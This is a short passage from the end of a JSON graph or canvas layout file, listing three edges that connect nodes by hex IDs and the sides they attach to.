		{"id":"3a7101c8cd4f8904","fromNode":"81ddbe4bfb75e3d1","fromSide":"bottom","toNode":"f5f5a70d731054e1","toSide":"left"},
		{"id":"0212a4a7f16cdc9a","fromNode":"b29a79a0d8d12c9f","fromSide":"bottom","toNode":"bf69323f6dcae9e1","toSide":"top"},
		{"id":"419432570d1064f1","fromNode":"681841061eb579dd","fromSide":"bottom","toNode":"37500d922dac1ae5","toSide":"top"}
	]
}